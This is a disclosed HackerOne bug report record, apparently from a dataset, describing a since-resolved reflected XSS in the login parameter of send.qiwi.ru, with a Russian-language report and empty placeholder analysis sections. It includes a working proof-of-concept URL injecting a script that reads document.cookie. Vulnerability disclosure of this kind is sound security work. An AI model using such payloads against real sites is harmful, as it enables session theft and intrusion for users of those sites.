---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '35413'
original_report_id: '35413'
title: '[send.qiwi.ru] XSS at auth?login='
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2014-11-13T11:41:39.349Z'
disclosed_at: '2014-12-17T17:21:53.212Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [send.qiwi.ru] XSS at auth?login=

## Metadata

- HackerOne Report ID: 35413
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2014-12-17T17:21:53.212Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

> Хост - send.qiwi.ru
> Тип - XSS
> https://send.qiwi.ru/auth?login="><script>alert(document.cookie)</scri
> pt>&password=123&go=%D0%92%D1%85%D0%BE%D0%B4
> Позволяет выпонить произвольный js а также обойти защиту от CSRF
> Рекомендации по устранению - сделать фильтрацию " ' < >

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
